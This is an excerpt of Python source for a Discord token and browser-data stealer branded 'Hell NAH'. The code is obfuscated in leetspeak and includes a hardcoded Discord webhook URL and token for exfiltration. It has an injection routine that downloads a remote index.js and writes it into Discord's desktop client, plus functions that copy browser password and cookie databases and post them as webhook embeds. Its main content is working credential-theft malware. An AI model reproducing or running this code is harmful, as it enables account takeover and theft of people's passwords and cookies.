...
inj3c710n_url = "https://raw.githubusercontent.com/vincyxiroff/botvps-discord/main/p/index.js"
color =  0x812118
DETECTED = False
...
hook1 = "https://discord.com/api/webhooks/1148380062140350545/qE6j8w69D_akTmH1Xel4ZPtWAbzNp4E4ifPRBK3lq9j1nrSboFhdA30wjPfuM-Nx1a7S"
...
def L04DUr118(hook, hook1, data='', files='', headers=''):
    for i in range(8):
        try:
            if headers != '':
                r = urlopen(Request(hook, data=data, headers=headers))
                r1 = urlopen(Request(hook1, data=data, headers=headers))
                return r
                return r1
            else:
                r = urlopen(Request(hook, data=data))
                r1 = urlopen(Request(hook1, data=data))
                return r
                return r1
        except: 
            pass
                                        ...
                                        if 'discord_desktop_core' in subsubsubdir:
                                            for file in subsubfiles:
                                                if file == 'index.js':
                                                    ...
                                                    inj3c710n_cont1 = inj3c710n_cont.replace("%WEBHOOK1%", hook1)

                                                    with open(file_path, "w", encoding="utf-8") as index_file:
                                                        index_file.write(inj3c710n_cont)
                                                        index_file.write(inj3c710n_cont1)
inj3c710n()
...
def UP104D70K3N(token, path):
    ...
    if pfp == None: 
        pfp = "https://cdn.discordapp.com/attachments/1137542250415538226/1148377744053375006/Screenshot_20230904_112100_YouTube.png"
    else:
    ...
    data = {
        ...
        "embeds": [
            ...
            "footer": {
                "text": "HELL NAH",
                "icon_url": "https://cdn.discordapp.com/attachments/1137542250415538226/1148377744053375006/Screenshot_20230904_112100_YouTube.png"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
        ...
        "avatar_url": "https://cdn.discordapp.com/attachments/1137542250415538226/1148377744053375006/Screenshot_20230904_112100_YouTube.png",
        "username": "HELL NAH",
        "attachments": []
        }
    L04DUr118(hook, hook1, data=dumps(data).encode(), headers=headers)
...
def UP104D(name, link):
    ...
    if name == "lxcook":
        ...
        data = {
            ...
            "embeds": [
                {
                    "title": "Hell NAH | Cookies",
                    "description": f"**Found**:\n{rb}\n\n**Data:**\n <:blackmember:1095740314683179139>  • **{C00K1C0UNt}** Cookies Found \n <:blackarrow:1095740975197995041> • [HellNAHCookies.txt]({link})",
                    "color": color,
                    "footer": {
                        "text": "Hell NAH",
                        "icon_url": "https://cdn.discordapp.com/attachments/1137542250415538226/1148377744053375006/Screenshot_20230904_112100_YouTube.png"
...
def g37P455W(path, arg):
    ...
    tempfold = temp + "lx" + ''.join(random.choice('bcdefghijklnmopqrstuvwxyz') for i in range(8)) + ".db"
...
def g37C00K13(path, arg):
    ...
    tempfold = temp + "lx" + ''.join(random.choice('bcdefghijklmonpqrstuvwxyz') for i in range(8)) + ".db"
